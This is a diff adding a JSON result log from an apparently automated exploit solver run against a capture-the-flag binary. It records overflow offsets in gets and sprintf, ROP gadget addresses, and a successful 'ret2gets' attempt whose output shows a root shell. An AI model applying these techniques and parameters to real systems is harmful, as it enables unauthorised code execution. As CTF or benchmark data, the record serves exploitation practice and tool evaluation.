@@ -1,0 +1,55 @@
+{
+  "name": "ch06_8835",
+  "ok": true,
+  "strategy": "ret2gets",
+  "detail": "gets(0x601258) -> system off=64",
+  "elapsed": 1.6,
+  "attempt_count": 2,
+  "flag_only": false,
+  "facts": {
+    "prot": {
+      "arch": "amd64/64",
+      "pie": false,
+      "canary": false,
+      "nx": true,
+      "relro": "Partial",
+      "static": false
+    },
+    "vulns": [
+      "sprintf@0x400663 disp=-128 off=136",
+      "gets@0x40069e disp=-64 off=72"
+    ],
+    "wins": [
+      "flag@0x400550(system(\"cat flag.txt\"))"
+    ],
+    "binsh": null,
+    "gadgets": {
+      "pop_rdi": "0x400713",
+      "pop_rbp": "0x400565",
+      "ret": "0x4004a1",
+      "leave": "0x4006a3"
+    },
+    "csu": true,
+    "mmap_rwx": null,
+    "fmt_buf": null,
+    "libc": null,
+    "notes": []
+  },
+  "attempts": [
+    {
+      "strategy": "ret2gets",
+      "desc": "gets(0x601258) -> system off=72",
+      "ok": false,
+      "elapsed": 0.46,
+      "tail": "-Warm Up-\nWOW:0x40060d\n>"
+    },
+    {
+      "strategy": "ret2gets",
+      "desc": "gets(0x601258) -> system off=64",
+      "ok": true,
+      "elapsed": 1.01,
+      "tail": "-Warm Up-\nWOW:0x40060d\n>PWNED_42\nroot\nuid=0(root) gid=0(root) groups=0(root)\n"
+    }
+  ],
+  "error": ""
+}
